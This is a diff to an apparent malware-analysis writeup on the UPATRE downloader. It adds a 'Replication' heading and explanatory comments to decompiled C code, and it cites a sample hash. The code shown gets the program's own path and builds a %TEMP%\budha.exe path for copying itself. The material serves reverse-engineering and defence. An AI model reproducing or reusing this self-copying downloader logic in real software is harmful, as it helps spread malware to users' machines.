@@ -4,15 +4,14 @@ Simply put, UPATRE is a downloader written in C/C++ that retrieves payloads via 
 
 Sample SHA 256: 0000b060341630c2385b5cea8ce2e866671519b31641f5a0c525b880fc655d9e
 
-## Downloader
-
+## Downloader - Replication
 ```C
  GetModuleHandleW(0);
   hHeap = HeapCreate(0, 0x2000u, 0);
   v0 = (WCHAR *)HeapAlloc(hHeap, 8u, 0x2000u);
-  lpBuffer = (LPWSTR)HeapAlloc(hHeap, 8u, 0x2000u);
-  GetModuleFileNameW(0, v0, 0x2000u);
-  GetTempPathW(0x1000u, lpBuffer);
+  lpBuffer = (LPWSTR)HeapAlloc(hHeap, 8u, 0x2000u); // Memory Allocation ^
+  GetModuleFileNameW(0, v0, 0x2000u); // Gets full path of current running process, stored in v0
+  GetTempPathW(0x1000u, lpBuffer); // Gets path to %TEMP%, stored in lpBuffer
   wsprintfW(lpBuffer, L"%s%s", lpBuffer, L"budha.exe");
   FileW = CreateFileW(v0, 0x80000000, 1u, 0, 3u, 0x80u, 0);
   hFile = FileW;
@@ -42,5 +41,9 @@ LABEL_8:
     ExitProcess(0);
   }
 ```
+
+
+
+
 
 ## First Payload 
